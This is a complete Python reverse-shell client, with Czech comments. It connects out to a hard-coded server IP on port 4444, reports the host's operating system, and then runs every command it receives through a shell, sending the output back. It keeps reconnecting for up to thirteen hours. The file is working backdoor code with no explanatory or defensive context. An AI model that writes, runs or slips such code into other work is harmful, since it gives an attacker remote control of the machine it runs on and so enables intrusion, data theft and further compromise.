import socket
import platform
import subprocess
import time
import os

SERVER_IP = '10.0.1.12'  # Změň na IP serveru
PORT = 4444
RECONNECT_INTERVAL = 5
TIMEOUT = 60 * 60 * 13  # 13 hodin

def get_os_info():
    return platform.platform()

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode(errors='ignore')
    except Exception as e:
        return str(e)

def connect():
    start_time = time.time()
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, PORT))
            s.send(get_os_info().encode())
            while True:
                cmd = s.recv(1024).decode()
                if not cmd:
                    break
                result = execute_command(cmd)
                s.send(result.encode())
        except:
            if time.time() - start_time > TIMEOUT:
                break
            time.sleep(RECONNECT_INTERVAL)

if __name__ == '__main__':
    connect()
